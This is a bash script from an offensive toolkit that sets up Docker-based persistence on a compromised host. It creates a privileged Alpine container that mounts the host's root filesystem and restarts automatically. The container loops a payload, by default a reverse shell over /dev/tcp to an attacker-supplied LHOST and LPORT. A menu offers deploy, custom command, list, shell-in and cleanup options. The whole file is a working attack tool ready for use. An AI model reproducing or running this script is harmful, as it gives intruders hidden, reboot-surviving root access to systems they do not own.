#!/bin/bash
# D3m0n1z3dShell — Docker Container Persistence (T1610)
# Based on Metasploit docker_image.rb — privileged Alpine container with restart=always

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_docker"
CONTAINER_PREFIX="d3m0n_"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   Docker Container Persistence                    ║"
    echo " ║   T1610 — Privileged container with host access   ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_docker(){
    if ! command -v docker >/dev/null 2>&1; then
        echo -e "${RED}[-] Docker not installed${NC}"
        return 1
    fi
    if ! docker ps >/dev/null 2>&1; then
        echo -e "${RED}[-] Docker not accessible (permission denied or daemon not running)${NC}"
        return 1
    fi
    return 0
}

install_container(){
    local PAYLOAD="$1" SLEEP="${2:-600}"
    local CNAME="${CONTAINER_PREFIX}$(head -c 6 /dev/urandom | xxd -p)"

    echo -e "${CYAN}[*] Pulling Alpine image...${NC}"
    docker pull alpine:latest 2>&1 | tail -1

    # Create entrypoint
    local ENTRY_SCRIPT=$(mktemp /tmp/.d3m0n_entry.XXXXXX)
    cat > "$ENTRY_SCRIPT" << 'SEOF'
#!/bin/sh
while true; do
    PAYLOAD_PLACEHOLDER &
    wait $!
    sleep SLEEP_PLACEHOLDER
done
SEOF
    sed -i "s|PAYLOAD_PLACEHOLDER|${PAYLOAD}|g" "$ENTRY_SCRIPT"
    sed -i "s|SLEEP_PLACEHOLDER|${SLEEP}|g" "$ENTRY_SCRIPT"

    # Create temporary container, copy files, commit
    local TMP_CONTAINER="${CNAME}_tmp"
    docker create --name "$TMP_CONTAINER" alpine:latest /bin/sh >/dev/null 2>&1
    docker cp "$ENTRY_SCRIPT" "${TMP_CONTAINER}:/entrypoint.sh" 2>/dev/null
    docker start "$TMP_CONTAINER" >/dev/null 2>&1
    docker exec "$TMP_CONTAINER" chmod +x /entrypoint.sh 2>/dev/null

    # Commit image
    local IMG_NAME="${MARKER}_$(head -c 4 /dev/urandom | xxd -p)"
    docker commit "$TMP_CONTAINER" "$IMG_NAME" >/dev/null 2>&1
    docker rm -f "$TMP_CONTAINER" >/dev/null 2>&1

    # Run persistent container
    local CID
    CID=$(docker run -dit \
        --name "$CNAME" \
        --privileged \
        -v /:/host \
        --restart=always \
        --label "${MARKER}=true" \
        "$IMG_NAME" \
        /entrypoint.sh 2>&1)

    rm -f "$ENTRY_SCRIPT"

    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Container running: ${CNAME}${NC}"
        echo -e "${GREEN}[+] Image: ${IMG_NAME}${NC}"
        echo -e "${YELLOW}[*] Host filesystem at /host inside container${NC}"
        echo -e "${YELLOW}[*] Payload loops every ${SLEEP}s, survives reboots${NC}"
        echo -e "${YELLOW}[*] Container ID: ${CID:0:12}${NC}"
    else
        echo -e "${RED}[-] Failed to start container${NC}"
    fi
}

menu(){
    banner
    check_docker || return 1

    echo -e "  ${CYAN}[1]${NC} Deploy (reverse shell)"
    echo -e "  ${CYAN}[2]${NC} Deploy (custom command)"
    echo -e "  ${CYAN}[3]${NC} List d3m0n containers"
    echo -e "  ${CYAN}[4]${NC} Shell into container"
    echo -e "  ${CYAN}[5]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-5]: " OPT

    case "$OPT" in
        1)
            read -p "  LHOST: " LHOST
            read -p "  LPORT: " LPORT
            read -p "  Loop interval seconds [600]: " SLP
            SLP="${SLP:-600}"
            PAYLOAD="/bin/sh -c 'nohup sh -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 2>/dev/null'"
            install_container "$PAYLOAD" "$SLP"
            ;;
        2)
            read -p "  Command: " CMD
            read -p "  Loop interval seconds [600]: " SLP
            SLP="${SLP:-600}"
            install_container "$CMD" "$SLP"
            ;;
        3)
            echo -e "${CYAN}[*] D3m0n containers:${NC}"
            docker ps -a --filter "label=${MARKER}=true" --format "  {{.Names}}\t{{.Status}}\t{{.Image}}" 2>/dev/null
            ;;
        4)
            docker ps --filter "label=${MARKER}=true" --format "{{.Names}}" 2>/dev/null | head -5
            read -p "  Container name: " CN
            docker exec -it "$CN" /bin/sh
            ;;
        5)
            echo -e "${YELLOW}[*] Removing d3m0n containers and images...${NC}"
            docker ps -a --filter "label=${MARKER}=true" --format "{{.Names}}" 2>/dev/null | while read -r c; do
                docker rm -f "$c" 2>/dev/null
                echo -e "  ${GREEN}[+] Removed container: $c${NC}"
            done
            docker images --format "{{.Repository}}" 2>/dev/null | grep "^${MARKER}" | while read -r img; do
                docker rmi -f "$img" 2>/dev/null
                echo -e "  ${GREEN}[+] Removed image: $img${NC}"
            done
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
